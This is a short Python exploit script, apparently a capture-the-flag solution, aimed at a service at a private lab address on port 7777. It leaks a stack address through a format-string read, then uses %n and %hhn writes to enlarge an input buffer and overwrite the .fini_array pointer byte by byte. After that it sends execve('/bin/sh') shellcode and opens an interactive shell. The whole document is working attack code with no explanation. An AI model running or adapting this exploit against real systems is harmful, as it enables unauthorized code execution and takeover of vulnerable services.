from pwnpwnpwn import * 
import re

shellcode = "\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

host = "10.211.55.16"
port = 7777

pat = "0x.*"
bss = 0x80eaf80
fini = 0x80e9f68


sock = make_conn(host,port)


def leakinputaddr(sock):
    recvuntil(sock,"bytes")
    sendline(sock,"%5$p")
    addr = recvuntil(sock,"bytes")
    match = re.search(pat,addr)
    addr = match.group()
    return int(addr,16)


def addsize(sock,inputaddr): 
    sendline(sock,pack32(inputaddr-0xc)+"%90c%7$n")

inputaddr = leakinputaddr(sock)
ret = inputaddr - 0x1c
addsize(sock,inputaddr)

for i in range(4):
    recvuntil(sock,"bytes")
    sendline(sock,pack32(fini) +"%" + str(((inputaddr >> i*8) & 0xff)-4) + "c%7$hhn")
    fini = fini + 1

recvuntil(sock,"bytes")
sendline(sock,shellcode)

inter(sock)
